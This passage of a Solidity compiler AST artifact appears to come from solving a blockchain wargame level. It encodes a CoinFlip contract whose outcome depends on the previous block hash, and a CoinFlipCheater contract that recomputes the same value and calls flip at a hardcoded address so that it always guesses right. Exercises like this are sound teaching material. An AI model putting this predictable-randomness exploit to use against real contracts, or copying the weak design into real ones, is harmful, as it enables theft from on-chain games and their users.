																	"referencedDeclaration": 4294967277,
																	"src": "436:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 39,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "436:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 40,
															"nodeType": "ExpressionStatement",
															"src": "436:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 45,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 43,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "457:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 44,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "468:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "457:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 46,
												"nodeType": "ExpressionStatement",
												"src": "457:21:0"
											},
											{
												"assignments": [
													48
												],
												"declarations": [
													{
														"constant": false,
														"id": 48,
														"mutability": "mutable",
														"name": "coinFlip",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "484:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 47,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "484:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 52,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 51,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 49,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "503:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 50,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "516:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "503:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "484:38:0"
											},
											{
												"assignments": [
													54
												],
												"declarations": [
													{
														"constant": false,
														"id": 54,
														"mutability": "mutable",
														"name": "side",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "528:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 53,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "528:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 61,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 55,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 48,
															"src": "540:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "552:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "540:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 59,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "563:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 60,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "540:28:0",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 58,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "556:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "528:40:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 64,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 62,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 54,
														"src": "579:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 63,
														"name": "_guess",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 18,
														"src": "587:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "579:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 77,
													"nodeType": "Block",
													"src": "652:54:0",
													"statements": [
														{
															"expression": {
																"id": 73,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 71,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "660:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"hexValue": "30",
																	"id": 72,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "678:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "660:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 74,
															"nodeType": "ExpressionStatement",
															"src": "660:19:0"
														},
														{
															"expression": {
																"hexValue": "66616c7365",
																"id": 75,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "694:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															"functionReturnParameters": 22,
															"id": 76,
															"nodeType": "Return",
															"src": "687:12:0"
														}
													]
												},
												"id": 78,
												"nodeType": "IfStatement",
												"src": "575:131:0",
												"trueBody": {
													"id": 70,
													"nodeType": "Block",
													"src": "595:51:0",
													"statements": [
														{
															"expression": {
																"id": 66,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "603:17:0",
																"subExpression": {
																	"id": 65,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "603:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 67,
															"nodeType": "ExpressionStatement",
															"src": "603:17:0"
														},
														{
															"expression": {
																"hexValue": "74727565",
																"id": 68,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "635:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															"functionReturnParameters": 22,
															"id": 69,
															"nodeType": "Return",
															"src": "628:11:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "1d263f67",
									"id": 80,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 18,
												"mutability": "mutable",
												"name": "_guess",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "295:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 17,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "295:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "294:13:0"
									},
									"returnParameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 21,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "324:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 20,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "324:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "323:6:0"
									},
									"scope": 81,
									"src": "281:429:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 82,
							"src": "57:655:0"
						}
					],
					"src": "32:680:0"
				},
				"id": 0
			},
			"contracts/CoinFlipCheater.sol": {
				"ast": {
					"absolutePath": "contracts/CoinFlipCheater.sol",
					"exportedSymbols": {
						"CoinFlip": [
							81
						],
						"CoinFlipCheater": [
							140
						]
					},
					"id": 141,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 83,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:1"
						},
						{
							"absolutePath": "contracts/CoinFlip.sol",
							"file": "./CoinFlip.sol",
							"id": 84,
							"nodeType": "ImportDirective",
							"scope": 141,
							"sourceUnit": 82,
							"src": "57:24:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 140,
							"linearizedBaseContracts": [
								140
							],
							"name": "CoinFlipCheater",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 87,
										"nodeType": "Block",
										"src": "128:2:1",
										"statements": []
									},
									"id": 88,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 85,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "125:2:1"
									},
									"returnParameters": {
										"id": 86,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "128:0:1"
									},
									"scope": 140,
									"src": "114:16:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 91,
									"mutability": "mutable",
									"name": "FACTOR",
									"nodeType": "VariableDeclaration",
									"scope": 140,
									"src": "136:94:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 89,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "136:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 90,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "153:77:1",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 94,
									"mutability": "mutable",
									"name": "coinFlipAddress",
									"nodeType": "VariableDeclaration",
									"scope": 140,
									"src": "236:68:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 92,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "236:7:1",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"hexValue": "307833334337416639643045313046423444323330443331373337364338376361423830433237364563",
										"id": 93,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "262:42:1",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										},
										"value": "0x33C7Af9d0E10FB4D230D317376C87caB80C276Ec"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 138,
										"nodeType": "Block",
										"src": "350:253:1",
										"statements": [
											{
												"assignments": [
													100
												],
												"declarations": [
													{
														"constant": false,
														"id": 100,
														"mutability": "mutable",
														"name": "blockValue",
														"nodeType": "VariableDeclaration",
														"scope": 138,
														"src": "360:18:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 99,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "360:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 110,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 107,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 104,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "399:5:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 105,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "399:12:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 106,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "414:1:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "399:16:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 103,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "389:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 108,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "389:27:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 102,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "381:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 101,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "381:7:1",
															"typeDescriptions": {}
														}
													},
													"id": 109,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "381:36:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "360:57:1"
											},
											{
												"assignments": [
													112
												],
												"declarations": [
													{
														"constant": false,
														"id": 112,
														"mutability": "mutable",
														"name": "coinFlip",
														"nodeType": "VariableDeclaration",
														"scope": 138,
														"src": "427:16:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 111,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "427:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 116,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 115,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 113,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 100,
														"src": "446:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 114,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 91,
														"src": "459:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "446:19:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "427:38:1"
											},
											{
												"assignments": [
													118
												],
												"declarations": [
													{
														"constant": false,
														"id": 118,
														"mutability": "mutable",
														"name": "side",
														"nodeType": "VariableDeclaration",
														"scope": 138,
														"src": "476:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 117,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "476:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 125,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 121,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 119,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 112,
															"src": "488:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 120,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "500:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "488:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 123,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "511:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 124,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "488:28:1",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 122,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "504:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "476:40:1"
											},
											{
												"assignments": [
													128
												],
												"declarations": [
													{
														"constant": false,
														"id": 128,
														"mutability": "mutable",
														"name": "cf",
														"nodeType": "VariableDeclaration",
														"scope": 138,
														"src": "527:11:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$81",
															"typeString": "contract CoinFlip"
														},
														"typeName": {
															"id": 127,
															"nodeType": "UserDefinedTypeName",
															"pathNode": {
																"id": 126,
																"name": "CoinFlip",
																"nodeType": "IdentifierPath",
																"referencedDeclaration": 81,
																"src": "527:8:1"
															},
															"referencedDeclaration": 81,
															"src": "527:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_CoinFlip_$81",
																"typeString": "contract CoinFlip"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 132,
												"initialValue": {
													"arguments": [
														{
															"id": 130,
															"name": "coinFlipAddress",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 94,
															"src": "550:15:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 129,
														"name": "CoinFlip",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 81,
														"src": "541:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_contract$_CoinFlip_$81_$",
															"typeString": "type(contract CoinFlip)"
														}
													},
													"id": 131,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "541:25:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_CoinFlip_$81",
														"typeString": "contract CoinFlip"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "527:39:1"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 135,
															"name": "side",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 118,
															"src": "591:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"expression": {
															"id": 133,
															"name": "cf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 128,
															"src": "583:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_CoinFlip_$81",
																"typeString": "contract CoinFlip"
															}
														},
														"id": 134,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "flip",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 80,
														"src": "583:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
															"typeString": "function (bool) external returns (bool)"
														}
													},
													"id": 136,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "583:13:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"functionReturnParameters": 98,
												"id": 137,
												"nodeType": "Return",
												"src": "576:20:1"
											}
										]
									},
									"functionSelector": "aa1b510e",
									"id": 139,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "cheat",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 95,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "325:2:1"
									},
									"returnParameters": {
										"id": 98,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 97,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 139,
												"src": "344:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 96,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "344:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "343:6:1"
									},
									"scope": 140,
									"src": "311:292:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 141,
							"src": "83:522:1"
						}
					],
					"src": "32:573:1"
				},
				"id": 1
			}
		}
	}
}